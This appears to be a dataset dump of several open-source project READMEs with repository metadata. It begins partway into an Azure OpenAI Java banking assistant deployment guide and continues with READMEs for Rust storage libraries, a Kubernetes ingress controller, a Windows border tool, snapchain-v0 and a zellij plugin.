The default LLM used in this project is *gpt-4o-mini*. It's a cost-efficient small model with enhanced planning, reasoning capabilities which are required by this use case to reliably select the right agent based on the chat conversation and to properly handle tools call.However, in case of long chat or some words, the model might fail sometimes to detect the right user intent especially when he/she asks to pay a bill based on image upload. Based on our tests *gpt4-o* provides better results but it's more expensive and slower. To read more about the models and prices, check [here](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/). 

You can test different models and versions by changing the , `AZURE_OPENAI_CHATGPT_MODEL`, `AZURE_OPENAI_CHATGPT_VERSION` and `AZURE_OPENAI_CHATGPT_DEPLOYMENT` environment variable to the desired model like below:

```shell
azd env set AZURE_OPENAI_CHATGPT_MODEL gpt-4o
azd env set AZURE_OPENAI_CHATGPT_VERSION 2024-05-13
azd env set AZURE_OPENAI_CHATGPT_DEPLOYMENT gpt-4o
```
### Enabling Application Insights

Applications Insights is enabled by default. It allows to investigate each request tracing along with the logging of errors.

If you want to disable it set the `AZURE_USE_APPLICATION_INSIGHTS` variable to false before running `azd up`

1. Run `azd env set AZURE_USE_APPLICATION_INSIGHTS false`
1. Run `azd up`

To see the performance data, go to the Application Insights resource in your resource group, click on the ""Investigate -> Performance"" blade and navigate to any HTTP request to see the timing data.
To inspect the performance of chat requests, use the ""Drill into Samples"" button to see end-to-end traces of all the API calls made for any chat request.
Under ""Trace & Events"" panel you can review custom Java informational logs to better understand content of OpenAI requests and responses.

![Tracing screenshot](docs/assets/transaction-tracing.png)

To see any exceptions and server errors, navigate to the ""Investigate -> Failures"" blade and use the filtering tools to locate a specific exception. You can see Java stack traces on the right-hand side.

### Enabling authentication

By default, the web app on ACA will have no authentication or access restrictions enabled, meaning anyone with routable network access to the web app can chat with your personal assistant.You can require authentication to your Microsoft Entra by following the [Add app authentication](https://learn.microsoft.com/en-us/azure/container-apps/authentication) tutorial and set it up against the deployed web app.


To then limit access to a specific set of users or groups, you can follow the steps from [Restrict your Microsoft Entra app to a set of users](https://learn.microsoft.com/entra/identity-platform/howto-restrict-your-app-to-a-set-of-users) by changing ""Assignment Required?"" option under the Enterprise Application, and then assigning users/groups access.  Users not granted explicit access will receive the error message -AADSTS50105: Your administrator has configured the application <app_name> to block users 

### App Continuous Integration with GitHub Actions

1. **Create a Service Principal for the github action pipeline**

    Use [az ad sp create-for-rbac](https://learn.microsoft.com/en-us/cli/azure/ad/sp#az_ad_sp_create_for_rbac) to create the service principal:
    
    ```bash
    groupId=$(az group show --name <resource-group-name>  --query id --output tsv)
    az ad sp create-for-rbac --name ""agent-openai-java-banking-assistant-pipeline-spi"" --role contributor --scope $groupId --sdk-auth
    ```
    Output is similar to:
    
    ```json
    {
    ""clientId"": ""xxxx6ddc-xxxx-xxxx-xxx-ef78a99dxxxx"",
    ""clientSecret"": ""xxxx79dc-xxxx-xxxx-xxxx-aaaaaec5xxxx"",
    ""subscriptionId"": ""xxxx251c-xxxx-xxxx-xxxx-bf99a306xxxx"",
    ""tenantId"": ""xxxx88bf-xxxx-xxxx-xxxx-2d7cd011xxxx"",
    ""activeDirectoryEndpointUrl"": ""https://login.microsoftonline.com"",
    ""resourceManagerEndpointUrl"": ""https://management.azure.com/"",
    ""activeDirectoryGraphResourceId"": ""https://graph.windows.net/"",
    ""sqlManagementEndpointUrl"": ""https://management.core.windows.net:8443/"",
    ""galleryEndpointUrl"": ""https://gallery.azure.com/"",
    ""managementEndpointUrl"": ""https://management.core.windows.net/""
    } 
    ```
    
    Save the JSON output because it is used in a later step. Also, take note of the clientId, which you need to update the service principal in the next section.

2. **Assign ACRPush permission to service Principal**
   
   This step enables the GitHub workflow to use the service principal to [authenticate with your container registry](https://learn.microsoft.com/en-us/azure/container-registry/container-registry-auth-service-principal) and to push a Docker image.
   Get the resource ID of your container registry. Substitute the name of your registry in the following az acr show command:
   ```bash
   registryId=$(az acr show --name <registry-name> --resource-group <resource-group-name> --query id --output tsv)
    ```

   Use [az role assignment create](https://learn.microsoft.com/en-us/cli/azure/role/assignment#az_role_assignment_create) to assign the AcrPush role, which gives push and pull access to the registry. Substitute the client ID of your service principal:
   ```bash
   az role assignment create --assignee <ClientId> --scope $registryId --role AcrPush
   ```

3. **Add the service principal to your GitHub environment secrets**

 - Go to your forked repository in GitHub and create an [environment]((https://docs.github.com/en/actions/deployment/targeting-different-environments/using-environments-for-deployment)) called 'Development' (yes this is the exact name; don't change it). If you want to change the environment name (also adding new branches and environments, change the current branch/env mapping) you can do that, but make sure to change the pipeline code accordingly in `.github/workflows/azure-dev.yml`.
 - Create 'Development' environment [secrets](https://docs.github.com/en/actions/security-guides/encrypted-secrets#creating-encrypted-secrets-for-a-repository) as below:
    | Secret                | Value                                                                                      |
    |-----------------------|--------------------------------------------------------------------------------------------|
    | AZURE_CREDENTIALS     | The entire JSON output from the service principal creation step                            |
    | SPI_CLIENT_ID         | The service principal client id used as username to login to Azure Container Registry      |
    | SPI_CLIENT_SECRET     | The service principal client secret used as password to login to Azure Container Registry  |
 - Create 'Development' [environment variables](https://docs.github.com/en/actions/learn-github-actions/variables#creating-configuration-variables-for-an-environment) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACR_NAME                  | The name of the Azure Container registry                                                   |
    | RESOURCE_GROUP            | The name of the resource group where your Azure Container Environment has been deployed    |
 - Create [repository variables](https://docs.github.com/en/actions/writing-workflows/choosing-what-your-workflow-does/store-information-in-variables#creating-configuration-variables-for-a-repository) as below:
    | Variable                | Value                                                                                        |
    |---------------------------|--------------------------------------------------------------------------------------------|
    | ACA_DEV_ENV_NAME                  | The name of the Azure Container Apps Environment                                       |
    | COPILOT_ACA_DEV_APP_NAME      | The container app name for the copilot orchestrator app                                    |
    | WEB_ACA_DEV_APP_NAME          | The container app name for the web frontend  app                                           |
    | ACCOUNTS_ACA_DEV_APP_NAME     | The container app name for the business account api                                        |
    | PAYMENTS_ACA_DEV_APP_NAME     | The container app name for the business payment api                                        |
    | TRANSACTIONS_ACA_DEV_APP_NAME | The container app name for the business payment api                                        |


### Cost estimation

Pricing varies per region and usage, so it isn't possible to predict exact costs for your usage.
However, you can try the [Azure pricing calculator](https://azure.com/e/8ffbe5b1919c4c72aed89b022294df76) for the resources below.

- Azure Containers App: Consumption workload profile with 4 CPU core and 8 GB RAM. Pricing per vCPU and Memory. [Pricing](https://azure.microsoft.com/en-us/pricing/details/container-apps/)
- Azure OpenAI: Standard tier, ChatGPT and Ada models. Pricing per 1K tokens used, and at least 1K tokens are used per question. [Pricing](https://azure.microsoft.com/en-us/pricing/details/cognitive-services/openai-service/)
- Azure Document Intelligence: SO (Standard) tier using pre-built layout. [Pricing](https://azure.microsoft.com/pricing/details/form-recognizer/)

- Azure Blob Storage: Standard tier with ZRS (Zone-redundant storage). Pricing per storage and read operations. [Pricing](https://azure.microsoft.com/pricing/details/storage/blobs/)
- Azure Monitor: Pay-as-you-go tier. Costs based on data ingested. [Pricing](https://azure.microsoft.com/pricing/details/monitor/)

The first 180,000 vCPU-seconds, 360,000 GiB-seconds, and 2 million requests each month are free for ACA. To reduce costs, you can switch to free SKUs Document Intelligence by changing the parameters file under the `infra` folder. There are some limits to consider; for example, the free resource only analyzes the first 2 pages of each document. 

‚ö†Ô∏è To avoid unnecessary costs, remember to take down your app if it's no longer in use,
either by deleting the resource group in the Portal or running `azd down`.


## Resources

Here are some resources to learn more about multi-agent architectures and technologies used in this sample:

- [Generative AI For Beginners](https://github.com/microsoft/generative-ai-for-beginners)
- [Azure OpenAI Service](https://learn.microsoft.com/azure/ai-services/openai/overview)
- [Semantic Kernel for Java](https://devblogs.microsoft.com/semantic-kernel/java-1-0-release-candidate-for-semantic-kernel-now-available/)
- [OpenAI's Bet on a Cognitive Architecture](https://blog.langchain.dev/openais-bet-on-a-cognitive-architecture/)
- [THE LANDSCAPE OF EMERGING AI AGENT ARCHITECTURES FOR REASONING, PLANNING, AND TOOL CALLING: A SURVEY](https://arxiv.org/pdf/2404.11584)
- [MicroAgents: Exploring Agentic Architecture with Microservices](https://devblogs.microsoft.com/semantic-kernel/microagents-exploring-agentic-architecture-with-microservices/)
- [Chat + Enterprise data with Azure OpenAI and Azure AI Search](https://github.com/Azure-Samples/azure-search-openai-java)
- [SK Agents Overview and High Level Design (.net)](https://github.com/microsoft/semantic-kernel/blob/ec26ce7cb70f933b52a62f0a4e1c7b98c49d590e/docs/decisions/0032-agents.md#usage-patterns)

You can also find [more Azure AI samples here](https://github.com/Azure-Samples/azureai-samples).

## FAQ

You can find answers to frequently asked questions in the [FAQ](./docs/faq.md).

## Troubleshooting

If you have any issue when running or deploying this sample, please check the [troubleshooting guide](./docs/troubleshooting.md). If you can't find a solution to your problem, please [open an issue](https://github.com/Azure-Samples/agent-openai-java-banking-assistant/issues) in this repository.

## Contributing

This project welcomes contributions and suggestions. Most contributions require you to agree to a
Contributor License Agreement (CLA) declaring that you have the right to, and actually do, grant us
the rights to use your contribution. For details, visit https://cla.opensource.microsoft.com.

When you submit a pull request, a CLA bot will automatically determine whether you need to provide
a CLA and decorate the PR appropriately (e.g., status check, comment). Simply follow the instructions
provided by the bot. You will only need to do this once across all repos using our CLA.

This project has adopted the [Microsoft Open Source Code of Conduct](https://opensource.microsoft.com/codeofconduct/).
For more information see the [Code of Conduct FAQ](https://opensource.microsoft.com/codeofconduct/faq/) or
contact [opencode@microsoft.com](mailto:opencode@microsoft.com) with any additional questions or comments.

## Trademarks

This project may contain trademarks or logos for projects, products, or services. Authorized use of Microsoft
trademarks or logos is subject to and must follow
[Microsoft's Trademark & Brand Guidelines](https://www.microsoft.com/en-us/legal/intellectualproperty/trademarks/usage/general).
Use of Microsoft trademarks or logos in modified versions of this project must not cause confusion or imply Microsoft sponsorship.
Any use of third-party trademarks or logos are subject to those third-party's policies.
",0,1,1,MIT,"aca-deploy.yaml,acr-build-push.yaml,azure-dev.yaml,infra-ci.yaml",2.0
arthurprs/canopydb,master,"# Canopydb

[![Crates.io](https://img.shields.io/crates/v/canopydb.svg)](https://crates.io/crates/canopydb)
[![Docs](https://docs.rs/canopydb/badge.svg)](https://docs.rs/canopydb/latest)
[![CI](https://github.com/arthurprs/canopydb/actions/workflows/ci.yml/badge.svg)](https://github.com/arthurprs/canopydb/actions/workflows/ci.yml)

Embedded Key-Value Storage Engine

* Fully transactional
* Ordered map API similar to `std::collections::BTreeMap`
* B+Tree implementation with prefix and suffix truncation
* Handles large values efficiently, with optional transparent compression
* Efficient IO utilization, with lower read and write amplification compared to alternatives
* Efficient durable commits via an optional Write-Ahead-Log (WAL)
* Efficient async durability with background WAL fsyncs (e.g. every 500ms)
* Bounded recovery times using an optional Write-Ahead-Log (WAL)
* ACID transactions with single-writer serializable snapshot isolation (SSI)
* Multi-Version-Concurrency-Control (MVCC) - writers do not block readers and vice versa
* Long running read transactions have limited impact on the database
* Supports larger than memory transactions
* Multiple key spaces per database - key space (Tree) management is fully transactional
* Multiple databases per environment - efficiently shares resources such as the WAL and page cache
* Supports cross database atomic commits

The storage engine is optimized for read heavy and read-modify-write workloads where a transactional key-value store is desired and a single-writer is desired or sufficient.

This is a design choice, as multi-writer transactions require a complexity jump and significant tradeoffs (e.g. write conflict failures), especially if it's to offer a flexible set of features (e.g. dynamic key spaces, large key/value support, larger than memory transactions, etc.) and stricter transaction isolation (e.g serializable). If you need a different set of tradeoffs such as extreme write performance, you're probably looking for [Fjall](https://github.com/fjall-rs/) or [RocksDb](https://github.com/facebook/rocksdb/).

## Examples

Basic usage

```rust
use canopydb::Database;

let sample_data: [(&[u8], &[u8]); 3] = [
    (b""baz"", b""qux""),
    (b""foo"", b""bar""),
    (b""qux"", b""quux""),
];
let _dir = tempfile::tempdir().unwrap();
let db = Database::new(_dir.path()).unwrap();
let tx = db.begin_write().unwrap();
{
    // multiple trees (keyspaces) per database, fully transactional
    let mut tree1 = tx.get_or_create_tree(b""tree1"").unwrap();
    let mut tree2 = tx.get_or_create_tree(b""tree2"").unwrap();
    for (k, v) in sample_data {
        tree1.insert(k, v).unwrap();
        tree2.insert(k, v).unwrap();
    }
    // the write transaction can read its own writes
    let maybe_value = tree1.get(b""foo"").unwrap();
    assert_eq!(maybe_value.as_deref(), Some(&b""bar""[..]));
}
// commit to persist the changes
tx.commit().unwrap();

// a read only transaction
let rx = db.begin_read().unwrap();
let tree = rx.get_tree(b""tree2"").unwrap().unwrap();
let maybe_value = tree.get(b""foo"").unwrap();
assert_eq!(maybe_value.as_deref(), Some(&b""bar""[..]));
// range iterators like a BTreeMap
for kv_pair_result in tree.range(&b""foo""[..]..).unwrap() {
    let (db_k, db_v) = kv_pair_result.unwrap();
    println!(""{db_k:?} => {db_v:?}"");
}
// full scan of the tree
for kv_pair_result in tree.iter().unwrap() {
    let (db_k, db_v) = kv_pair_result.unwrap();
    println!(""{db_k:?} => {db_v:?}"");
}
```

Multiple databases per environment

```rust
use canopydb::{EnvOptions, Environment};

let sample_data = [
    (&b""baz""[..], &b""qux""[..]),
    (&b""foo""[..], &b""bar""[..]),
    (&b""qux""[..], &b""quux""[..]),
];
let _dir = tempfile::tempdir().unwrap();
let mut options = EnvOptions::new(_dir.path());
// all databases in the same environment will share this 1GB cache
options.page_cache_size = 1024 * 1024 * 1024;
let env = Environment::new(_dir.path()).unwrap();

let db1 = env.get_or_create_database(""db1"").unwrap();
let db2 = env.get_or_create_database(""db2"").unwrap();
// Each database unique write transaction is independent.
let tx1 = db1.begin_write().unwrap();
let tx2 = db2.begin_write().unwrap();
let mut tree = tx1.get_or_create_tree(b""my_tree"").unwrap();
tree.insert(b""foo"", b""bar"").unwrap();
drop(tree);
tx1.commit().unwrap();
tx2.rollback().unwrap();

// Write transactions for databases in the same environment
// can be committed together atomically.
// This allows stablishing a consistent state between them.
let tx1 = db1.begin_write().unwrap();
let tx2 = db2.begin_write().unwrap();
// Use tx1 and tx2 here..
env.group_commit([tx1, tx2], false).unwrap();
```

## Status

Canopydb should be considered early stage software and new releases could be incompatible. Do not trust it with production data.

Help is welcome to test and improve it, hopefully removing the disclaimer above. It's been an experimental project for many years and rewritten a few times. Even though it's reasonably well tested, there could be bugs and sharp API corners.

## Benchmarks

See the [BENCHMARKS.md](https://github.com/arthurprs/canopydb/blob/master/BENCHMARKS.md) file in the repository.

## Comparison with other databases

Note that these are only brief high-level comparisons.

### SQLite

Canopydb, like the rest of the list, is a lower level storage engine with an ordered key-value interface. SQLite is a full-featured relational database, that supports complex SQL queries (e.g. joins and aggregations). While both are embedded databases, SQLite may be better suited in applications that can take advantage of SQL, while Canopydb is optimized for speed and simplicity.

### LMDB

Canopydb and LMDB both implement single writer, transactional, ordered key-value embedded databases. Canopydb is implemented in pure Rust and provides a safe and flexible API in addition to other functionalities. Whereas LMDB is implemented in C and has some potential complications such as the usage of memory-mapped files and relatively low max key size (> 511 bytes). Canopydb has a different MVCC implementation and uses an optional Write-Ahead-Log (WAL) which enables more efficient writes. LMDB doesn't use any background threads, whereas Canopydb has one background thread per Database.

### Redb

Canopydb and Redb are similar. Redb has a richer API that includes strongly typed tables, multi-tables and savepoints. Canopydb focuses on a byte oriented API, leaving type (de)serialization up to the user. Canopydb has a different MVCC implementation and an optional Write-Ahead-Log (WAL) which enables more efficient writes. Canopydb also offers efficient transparent compression for large values. Redb doesn't use any background threads, whereas Canopydb has one background thread per Database.

### Fjall and Rocksdb

Rocksdb and Fjall both implement Log-Structured-Merge Trees (LSMs) with optional support for transactions. These implementations can achieve higher random write performance and lower space utilization, although these come with tradeoffs and their corresponding downsides. For instance, while these libraries allow multiple concurrent write transactions, transactions have to fit in memory and have to perform conflict checking, so they can fail due to write-write and read-write conflicts (in case of SSI).

## License

This project is licensed under the MIT license.
",0,2,1,,ci.yml,3.0
tonbo-io/fusio,main,"# Fusio

<p align=""center"">
  <a href=""https://crates.io/crates/fusio"">
    <img alt=""crates.io"" src=""https://img.shields.io/crates/v/fusio"">
  </a>

  <a href=""https://docs.rs/fusio/latest/fusio/"">
    <img alt=""docs.rs"" src=""https://img.shields.io/docsrs/fusio"">
  </a>
</p>

`fusio` provides [random read](https://docs.rs/fusio/latest/fusio/trait.Read.html) and [sequential write](https://docs.rs/fusio/latest/fusio/trait.Write.html) traits to operate on multiple storage backends (e.g., local disk, Amazon S3) across various asynchronous runtimes‚Äîboth poll-based ([tokio](https://github.com/tokio-rs/tokio)) and completion-based ([tokio-uring](https://github.com/tokio-rs/tokio-uring), [monoio](https://github.com/bytedance/monoio))‚Äîwith:
- lean: binary size is at least 14√ó smaller than others.
- minimal-cost abstraction: compared to bare storage backends, trait definitions allow dispatching file operations without extra overhead.
- extensible: exposes traits to support implementing storage backends as third-party crates.

> **`fusio` is now at preview version, please join our [community](https://discord.gg/j27XVFVmJM) to attend its development and semantics / behaviors discussion.**

## Why do we need `fusio`?
In developing [Tonbo](https://github.com/tonbo-io/tonbo), we needed a flexible and efficient way to handle file and file system operations across multiple storage backends‚Äîsuch as memory, local disk, and remote object storage. We also required compatibility with various asynchronous runtimes, including both completion-based runtimes and event loops in languages like Python and JavaScript.

`fusio` addresses these needs by providing:
- offers traits that allow dispatch of file and file system operations to multiple storage backends.
- usable in diverse async runtimes, not only disk but also network I/O.
- ideal for embedded libs like Tonbo.
- can be extended via third-party crates, enabling custom asynchronous file and file system implementations.

For more context, please check [apache/arrow-rs#6051](https://github.com/apache/arrow-rs/issues/6051).

## How to use it?

### Installation
```toml
fusio = { version = ""*"", features = [""tokio""] }
```

### Examples

#### [Runtime agnostic](https://github.com/tonbo-io/fusio/blob/main/examples/src/multi_runtime.rs)

`fusio` supports switching the async runtime at compile time. Middleware libraries can build runtime-agnostic implementations, allowing the top-level application to choose the runtime.

#### [Object safety](https://github.com/tonbo-io/fusio/blob/main/examples/src/object.rs)

`fusio` provides two sets of traits:
- `Read` / `Write` / `Seek` / `Fs` are not object-safe.
- `DynRead` / `DynWrite` / `DynSeek` / `DynFs` are object-safe.

You can freely transmute between them.

#### [File system traits](https://github.com/tonbo-io/fusio/blob/main/examples/src/fs.rs)

`fusio` has an optional Fs trait (use `default-features = false` to disable it). It dispatches common file system operations (open, remove, list, etc.) to specific storage backends (local disk, Amazon S3).

#### [S3 support](https://github.com/tonbo-io/fusio/blob/main/examples/src/s3.rs)

`fusio` has optional Amazon S3 support (enable it with `features = [""tokio-http"", ""aws""]`); the behavior of S3 operations and credentials does not depend on `tokio`.

## When to choose `fusio`?

 Overall, `fusio` carefully selects a subset of semantics and behaviors from multiple storage backends and async runtimes to ensure native performance in most scenarios. For example, `fusio` adopts a completion-based API (inspired by [monoio](https://docs.rs/monoio/latest/monoio/io/trait.AsyncReadRent.html)) so that file operations on `tokio` and `tokio-uring`  have the same performance as they would without `fusio`.

### compare with `object_store`

`object_store` is locked to tokio and also depends on `bytes`. `fusio` uses `IoBuf` / `IoBufMut` to allow `&[u8]` and `Vec<u8>` to avoid potential runtime costs. If you do not need to consider other async runtimes, try `object_store`; as the official implementation, it integrates well with Apache Arrow and Parquet.

### compare with `opendal`

`fusio` does not aim to be a full data access layer like `opendal`. `fusio` keeps features lean, and you are able to enable features and their dependencies one by one. The default binary size of `fusio` is 16KB, which is smaller than `opendal` (439KB). If you need a full ecosystem of DAL (tracing, logging, metrics, retry, etc.), try opendal.

Also, compared with `opendal::Operator`, fusio exposes core traits and allows them to be implemented in third-party crates.

## Roadmap
- abstractions
  - [x] file operations
  - [x] (partial) file system operations
- storage backend implementations
  - disk
    - [x] tokio
    - [x] tokio-uring
    - [x] monoio
  - [x] network
    - [x] HTTP client trait
    - [x] network storage runtime support
      - [x] tokio (over reqwest)
      - [ ] monoio (over hyper-tls)
      - [ ] tokio-uring (over hyper-tls)
    - [x] Amazon S3
    - [ ] Azure Blob Storage
    - [ ] Cloudflare R2
  - [ ] in-memory
- [ ] [conditional operations](https://aws.amazon.com/cn/about-aws/whats-new/2024/08/amazon-s3-conditional-writes/)
- extensions
  - [x] parquet support
  - [x] object_store support

## Credits
- `monoio`: all core traits‚Äîbuffer, read, and write‚Äîare highly inspired by it.
- `futures`: its design of abstractions and organization of several crates (core, util, etc.) to avoid coupling have influenced `fusio`'s design.
- `opendal`: Compile-time poll-based/completion-based runtime switching inspires `fusio`.
- `object_store`: `fusio` adopts S3 credential and path behaviors from it.
",5,18,8,Apache-2.0,ci.yml,73.0
DioCrafts/flusso,main,"
<div id=""top""></div>

<p align=""center"">Help us grow and star us on Github! ‚≠êÔ∏è</p>

<div align=""center"">
  <img src=""images/flusso-logo.svg"" alt=""Flusso Logo"" width=""250"">
</div>

# üöÄ Flusso - Secure, High-Performance Kubernetes Ingress Controller and API Gateway in Rust ü¶Äüîí

**Flusso** is a secure, high-performance solution for Kubernetes, combining the functionalities of an **Ingress Controller** and an **API Gateway**. Written in **Rust**, Flusso is designed to meet the needs of modern cloud-native environments, offering a lightweight and efficient alternative to traditional solutions.


<div align=""center"">
  
  [![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg?style=for-the-badge)](https://opensource.org/licenses/MIT)
  [![Docker Pulls](https://img.shields.io/docker/pulls/diocrafts/flusso-ingress-controller?style=for-the-badge&logo=docker)](https://hub.docker.com/r/diocrafts/flusso-ingress-controller)
  [![Latest Release](https://img.shields.io/github/release/diocrafts/flusso.svg?style=for-the-badge)](https://github.com/diocrafts/flusso/releases)
  [![GitHub Stars](https://img.shields.io/github/stars/diocrafts/flusso?style=for-the-badge&logo=github)](https://github.com/diocrafts/flusso/stargazers)
  [![GitHub Issues](https://img.shields.io/github/issues/diocrafts/flusso?style=for-the-badge)](https://github.com/diocrafts/flusso/issues)
  [![GitHub Forks](https://img.shields.io/github/forks/diocrafts/flusso?style=for-the-badge&logo=github)](https://github.com/diocrafts/flusso/network/members)
  [![Last Commit](https://img.shields.io/github/last-commit/diocrafts/flusso?style=for-the-badge)](https://github.com/diocrafts/flusso/commits/main)

</div>


## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Configuration](#configuration)
- [Usage](#usage)
- [Kubernetes Setup](#kubernetes-setup)
- [Contributing](#contributing)
- [License](#license)
- [Contact & Support](#contact--support)

---

## Features ‚ú®

- **Lightweight and Fast** ‚ö°: Built in Rust ü¶Ä for high performance and low memory and CPU consumption.
- **Advanced Load Balancing** üîÑ: Supports custom load balancing algorithms for optimized traffic distribution.
- **Secure by Design** üîí: Implements modern TLS protocols with Rustls for enhanced security.
- **Dynamic Backends** üîÑ: Automatically updates routing based on Kubernetes service changes.
- **Flexible Configuration** üõ†Ô∏è: Easily configurable via YAML files or environment variables.
- **Minimal Dependencies** üì¶: Avoids unnecessary dependencies for lightweight container images.

---

## Installation

Flusso provides two components for deployment: the **Ingress Controller** and the **API Gateway**. You can choose to deploy either or both of them depending on your needs. Both components can be deployed using **Helm** or **Docker**, and here are the instructions for each.

### 1. **Install Ingress Controller using Helm**

To install the Flusso Ingress Controller in your Kubernetes cluster, you can use Helm. Follow these steps:

1. **Add the Flusso Helm Chart repository:**

   ```bash
   helm repo add flusso https://diocrafts.github.io/flusso
   helm repo update
   ```

2. **Install the Ingress Controller:**

   ```bash
   helm install flusso-ingress-controller flusso/flusso-ingress-controller        --namespace ingress-system        --create-namespace
   ```

   This will install the Flusso Ingress Controller in the `ingress-system` namespace. You can customize your deployment by modifying values in the Helm chart.

3. **Verify the deployment:**

   Check the status of the Ingress Controller to ensure it is running:

   ```bash
   kubectl get pods -n ingress-system
   ```

---

### 2. **Install API Gateway using Helm**

To install the Flusso API Gateway in your Kubernetes cluster, follow these steps:

1. **Add the Flusso Helm Chart repository:**

   ```bash
   helm repo add flusso https://diocrafts.github.io/flusso
   helm repo update
   ```

2. **Install the API Gateway:**

   ```bash
   helm install flusso-api-gateway flusso/flusso-api-gateway        --namespace api-gateway-system        --create-namespace
   ```

   This will install the Flusso API Gateway in the `api-gateway-system` namespace. You can modify the Helm chart values to customize your deployment.

3. **Verify the deployment:**

   Check the status of the API Gateway to ensure it is running:

   ```bash
   kubectl get pods -n api-gateway-system
   ```


---

## Configuration

Flusso supports several configuration options, both via environment variables and Helm chart values.

- **SERVER_ADDR**: Define the address where the Ingress Controller will listen. Default is `0.0.0.0:8080`.
- **TLS_ENABLED**: Enable or disable TLS (default is `true`).
- **TLS_CERT_PATH / TLS_KEY_PATH**: Paths to TLS certificate and key files.

---

## Usage

Flusso automatically routes incoming traffic to Kubernetes services defined by Ingress resources.

### Monitoring

Flusso exposes a web GUI at `http://<controller-ip>:8081` with insights into backends and routing.

---

## Kubernetes Setup

Flusso is designed for seamless integration in Kubernetes.

### Prerequisites

- Kubernetes version 1.19 or higher
- Helm version 3 or higher

---

## Contributing

We welcome contributions to make Flusso even better! If you have suggestions for improvements, open a GitHub issue or submit a pull request. Please refer to our [Contributing Guide](CONTRIBUTING.md) for more details.

---

## License

Flusso is licensed under the [MIT License](LICENSE).

---

## Contact & Support

- **GitHub**: [GitHub Repository](https://github.com/diocrafts/flusso)
- **Docker Hub**: [Docker Hub Repository](https://hub.docker.com/r/diocrafts/flusso)

For further support, reach out via GitHub issues or visit our community forums.
",2,0,2,MIT,docker-build-and-push.yml,17.0
lukeyou05/tacky-borders,main,"# tacky-borders

![image](https://github.com/user-attachments/assets/e1786c07-4168-42ca-8ada-ccbabcf74a63)
tacky-borders lets you customize the borders on Windows 11 (and maybe 10?).

## Installation

Download your desired version from the releases page, unzip it, and run the .exe! tacky-borders will automatically generate a config file for you in ```%userprofile%/.config/tacky-borders/```.

Alternatively, if you want to build it yourself, first make sure you have installed the required tools such as rustup, cargo, and MSVC build tools. Then, just clone the repo, cd into tacky-borders, and do ```cargo build``` or ```cargo run```

## Uninstallation

Just delete the .exe and the config file located in ```%userprofile%/.config/tacky-borders/```.

## Configuration Options

The config.yaml is located in ```%userprofile%/.config/tacky-borders/```. You can easily access this folder by right clicking on the tray icon and hitting ""Show Config""

The following options are customizable and are included in the auto-generated config file:

- border_width: Thickness of the borders
- border_offset: How close the borders are to the window edges
- border_radius: Leave it at -1 to let tacky-borders handle the radius adjstments, or set it to any other value to use as the radius.
- active_color: Color of the active window. Currently, you can use ""accent"" to grab the Windows accent color, or use your own hex code like ""#ffffff""
- inactive_color: Color of the inactive window. Again, you can use ""accent"" to grab the Windows accent color, or use your own hex code like ""#ffffff""

Additionally, there are some optional config options that are not included in the auto-generated config file:

- init_delay: The delay in milliseconds between when a new window is first opened and when the border shows itself. I recommend setting this to 0 if you have disabled Windows animations.
- unminimize_delay: The delay in milliseconds between when a window is restored/unminimized and when the border shows itself. I also recommend setting this to 0 if you have disabled Windows animations.

Unfortunately, these delays are necessary due to limitations with the Win32 API regarding window animations.

## Comparison to cute-borders

Here is another great app that achieves similar fuctionality: <https://github.com/keifufu/cute-borders>. I've taken a lot of inspiration from them and would highly recommend checking them out! Our apps have totally different implementations, each with their own limitations, but which one you should use boils down to the following:

I recommend using tacky-borders if you want:

- borders thicker than 1px
- gradients (upcoming feature)
- animations (also upcoming lol)
- Windows 10 support (not fully tested)

Otherwise, I recommend using cute-borders because I find it to be more stable and performant.
",6,0,2,MIT,rust.yml,8.0
farcasterxyz/snapchain-v0,main,"# Snapchain v0

Prototype for the snapchain proposal

## Prerequisites

Before you begin, ensure you have the following installed:
- Rust (latest stable version)
- Cargo (comes with Rust)
- Protocol Buffers compiler (protoc)

## Installation

1. First clone the malachite repo and checkout the correct commit:
   ```
   git clone git@github.com:informalsystems/malachite.git
   cd malachite
   git checkout 8a9f3702eb41199bc8a7f45139adba233a04744a # Remember to update GitHub workflow when changing
   cd code && cargo build
   ```
2. Then clone the snapchain repo and build it:
   ```
   cd ..
   git clone https://github.com/farcasterxyz/snapchain-v0.git
   cd snapchain-v0
   cargo build
   ```

## Testing

After setting up your Rust toolchain above, you can run tests with:

```
cargo test
```

## Running the Application

For development, you can run multiple nodes by running:
```
make dev
```

These will be configured to communicate with each other.

To query a node, you can run `grpcurl` from within the container:

```
docker compose exec node1 grpcurl -import-path proto -proto proto/rpc.proto list
```

## Clean up

You can remove any cached items by running:

```
make clean
```
",0,2,18,,verify.yml,99.0
laperlej/zellij-choose-tree,main,"# zellij-choose-tree

[showcase.webm](https://github.com/user-attachments/assets/8a8e19d9-f527-4dfe-9952-a1aec1ba7ef0)

zellij-choose-tree is a plugin for [zellij](https://github.com/zellij-org/zellij) that allows users to quickly switch between sessions.

It is inspired by [tmux](https://github.com/tmux/tmux/) choose-tree accessible with `Ctrl+b s` by default.

## Usage

- Up/Down k/j arrow keys to navigate
- Left/Right h/l to fold/unfold to reveal tabs/panes
- `x` to delete selected session (tab/pane deletion not supported yet)
- `Enter` to switch to selected session/tab/pane
- `1-9` `A-Z` to switch to session/tab/pane without navigating

## Installation

Download zellij-choose-tree.wasm from the [latest release](https://github.com/laperlej/zellij-choose-tree/releases/latest) and place it in your zellij plugins folder.

```bash
mkdir -p ~/.config/zellij/plugins
wget https://github.com/laperlej/zellij-choose-tree/releases/latest/download/zellij-choose-tree.wasm -O ~/.config/zellij/plugins/zellij-choose-tree.wasm
```

## Configuration

Add the plugin to a keybinding in your config.toml.

In this example, the keybinding is bound to `s` in tmux mode.

```kdl

tmux {
    # other keybinds here ...
    bind ""s"" { LaunchOrFocusPlugin ""file:~/.config/zellij/plugins/zellij-choose-tree.wasm"" {
            floating true
            move_to_focused_tab true
            show_plugins false
        }; SwitchToMode ""Locked"";
    }
}
```

Optional arguments:

- `show_plugins true|false`: display/hide the plugin panes, default is `false`

## Use as a sessionpicker

This plugin can also act as a `sessionpicker` when called through a pipe.

In your config file:

```kdl
plugins {
    // other plugins here ...
    sessionpicker location=""file:~/.config/zellij/plugins/zellij-choose-tree.wasm""
}
```

From the command line:

```bash
zellij pipe --plugin sessionpicker
```

The name of the selected session will be returned.

Other plugins can also call this plugin through a pipe in the same way.

